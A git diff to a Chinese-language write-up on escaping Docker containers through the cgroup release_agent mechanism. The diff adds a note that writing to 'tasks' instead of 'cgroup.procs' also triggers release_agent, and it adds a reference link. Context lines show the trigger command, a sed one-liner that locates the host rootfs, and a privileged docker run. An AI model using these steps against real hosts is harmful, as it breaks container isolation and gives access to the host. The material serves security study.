@@ -49,6 +49,9 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
   ```
   host_path='/var/lib/docker/devicemapper/mnt/'`sed -n 's/\/dev\/mapper\/docker\-[0-9]*:[0-9]*\-[0-9]*\-\(.*\) \/\(.*\)/\1/p' /etc/mtab`'/rootfs'
   ```
+  
+  清空子cgroup下的cgroup.procs中的所有进程，触发release_agent执行写入的命令，这里有一个问题，cgroup.procs看起来和tasks貌似区别不大，可以简单理解成cgroup.procs是进程级别的管理，tasks是进程级别的管理，在实际测试中，修改`sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"`为`sh -c "echo \$\$ > /tmp/cgrp/x/tasks"`也是同样会触发release_agent的
+  
 ## 用处不大的tips
   除了找到容器在宿主机的真实路径外，也是有其他方式的，只满足上面这两个条件很容易可以想到挂载目录，如果以以下方式启动docker
   `docker run -it --cap-add='SYS_ADMIN' -v /tmp:/tmp/host_tmp centos bash`
@@ -73,3 +76,4 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 2. [cgroups(7) - Linux manual page](https://man7.org/linux/man-pages/man7/cgroups.7.html)
 3. [PID/TID/TGID参考](https://www.cnblogs.com/wipan/p/9488318.html)
 4. [Docker存储驱动程序](https://docs.docker.com/storage/storagedriver/)
+5. [procs 和tasks 的区别](http://linux.laoqinren.net/posts/hierarchy-without-controller-group/#procs-%E5%92%8Ctasks-%E7%9A%84%E5%8C%BA%E5%88%AB)
